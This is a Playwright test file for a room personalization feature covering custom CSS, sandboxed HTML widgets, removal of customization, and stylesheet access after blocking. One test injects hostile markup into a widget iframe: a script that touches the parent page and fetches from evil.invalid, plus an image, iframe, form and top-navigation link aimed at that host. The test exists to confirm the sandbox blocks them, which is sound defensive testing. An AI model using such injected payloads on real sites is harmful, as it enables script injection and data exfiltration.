import { expect, test } from '@playwright/test';
import { provisionAccount } from '../support/accounts';
import { apiAs, befriend, roomPath, watchCsp } from '../support/rooms';
import { signedIn, expectNoOverflow } from '../support/sessions';
import { expectAccessibleFromTop } from '../support/a11y';

test('personalization editor saves typography and ordered isolated text widgets', async ({
  page,
}, testInfo) => {
  const account = provisionAccount({ complete: true });
  await signedIn(page, account);
  const csp = watchCsp(page);
  await page.goto(`${roomPath(account)}/customize`);
  await page
    .getByLabel('Room CSS')
    .fill('.room-title { font-weight: 400; text-align: center; }');
  await page.getByRole('button', { name: 'Add text widget' }).click();
  await page.getByLabel('Widget title', { exact: true }).fill('A little note');
  await page
    .getByLabel('Widget HTML')
    .fill('<p>Hello <strong>friends</strong></p>');
  await page
    .getByRole('button', { name: 'Save personalization', exact: true })
    .click();
  await expect(
    page.getByText('Personalization saved.', { exact: true }),
  ).toBeVisible();
  await expectAccessibleFromTop(page);
  await expectNoOverflow(page);
  await page.goto(roomPath(account));
  await expect(page.locator('#room-owner-name')).toHaveCSS(
    'font-weight',
    '400',
  );
  await expect(
    page
      .frameLocator('iframe[title="A little note"]')
      .getByText('Hello friends'),
  ).toBeVisible();
  await expect(page.locator('iframe[title="A little note"]')).toHaveAttribute(
    'sandbox',
    '',
  );
  await expectNoOverflow(page);
  expect(csp).toEqual([]);
  await page.screenshot({
    path: testInfo.outputPath('room-personalization.png'),
    fullPage: true,
  });
  const css = await page.request.get(
    `${roomPath(account)}/personalization.css`,
  );
  expect(css.headers()['cache-control']).toContain('no-store');
  expect(css.headers()['content-type']).toContain('text/css');
  expect(await css.text()).toContain('.room-canvas[data-personalization=');
});

test('sandbox stays opaque and blocks script, network, forms and navigation even with hostile child bytes', async ({
  page,
}) => {
  const account = provisionAccount({ complete: true });
  const person = await apiAs(account);
  await person.call('PUT', '/me/room/personalization', {
    cssSource: '',
    widgets: [{ title: 'Isolated note', source: '<p>Safe note</p>' }],
    expectedUpdatedAt: null,
  });
  await signedIn(page, account);
  await page.goto(roomPath(account));
  const iframe = page.locator('iframe[title="Isolated note"]');
  await expect(iframe).toBeVisible();
  const requests: string[] = [];
  // CSP-blocked attempts still emit request events in Chromium. Routing sees
  // requests that would actually reach the network, before any bytes leave.
  await page.route('https://evil.invalid/**', async (route) => {
    requests.push(route.request().url());
    await route.abort();
  });
  // Defense in depth: deliberately bypass the compiler in this browser fixture.
  await iframe.evaluate((element) => {
    const frame = element as HTMLIFrameElement;
    frame.srcdoc = frame.srcdoc.replace(
      '<body>',
      '<body><script>parent.document.body.dataset.compromised="yes";fetch("https://evil.invalid/script")</script><img src="https://evil.invalid/image"><iframe src="https://evil.invalid/frame"></iframe><form action="https://evil.invalid/form"><button>Send</button></form><a href="https://evil.invalid/top" target="_top">Escape</a>',
    );
  });
  const child = page.frameLocator('iframe[title="Isolated note"]');
  await expect(child.getByText('Safe note')).toBeVisible();
  await expect(page.locator('body')).not.toHaveAttribute(
    'data-compromised',
    'yes',
  );
  const opaque = await child.locator('body').evaluate(() => {
    try {
      return parent.document === document;
    } catch {
      return 'opaque';
    }
  });
  expect(opaque).toBe('opaque');
  await child.getByRole('button', { name: 'Send' }).click();
  await expect(child.getByText('Safe note')).toBeVisible();
  await child.getByRole('link', { name: 'Escape' }).click();
  await expect(child.getByText('Safe note')).toBeVisible();
  expect(requests).toEqual([]);
  expect(page.url()).toContain(roomPath(account));
});

test('removing customization restores the token Room', async ({ page }) => {
  const account = provisionAccount({ complete: true });
  const person = await apiAs(account);
  const saved = await person.call<{ updatedAt: string }>(
    'PUT',
    '/me/room/personalization',
    {
      cssSource: '.room-title{font-style:italic}',
      widgets: [{ title: 'Temporary', source: '<p>Temporary text</p>' }],
      expectedUpdatedAt: null,
    },
  );
  await person.call('PUT', '/me/room/personalization', {
    cssSource: '',
    widgets: [],
    expectedUpdatedAt: saved.updatedAt,
  });
  await signedIn(page, account);
  await page.goto(roomPath(account));
  await expect(page.locator('iframe')).toHaveCount(0);
  await expect(page.locator('link[href$="personalization.css"]')).toHaveCount(
    0,
  );
});

test('stylesheet reauthorizes after a block and matches an absent Room', async ({
  page,
}) => {
  const ownerAccount = provisionAccount({ complete: true });
  const viewerAccount = provisionAccount({ complete: true });
  const owner = await apiAs(ownerAccount);
  const viewer = await apiAs(viewerAccount);
  await befriend(owner, viewer);
  await owner.call('PUT', '/me/room/personalization', {
    cssSource: '.room-title{font-weight:700}',
    widgets: [],
    expectedUpdatedAt: null,
  });
  await signedIn(page, viewerAccount);
  const url = `${roomPath(ownerAccount)}/personalization.css`;
  const allowed = await page.request.get(url);
  expect(allowed.status()).toBe(200);
  expect(allowed.headers()['cache-control']).toContain('no-store');
  await owner.call('POST', '/blocks', { username: viewerAccount.username });
  const denied = await page.request.get(url);
  const missing = await page.request.get(
    '/rooms/no_such_person/personalization.css',
  );
  expect(denied.status()).toBe(404);
  expect(missing.status()).toBe(404);
  expect(await denied.text()).toBe(await missing.text());
  for (const header of [
    'content-type',
    'cache-control',
    'x-content-type-options',
  ]) {
    expect(denied.headers()[header]).toBe(missing.headers()[header]);
  }
});
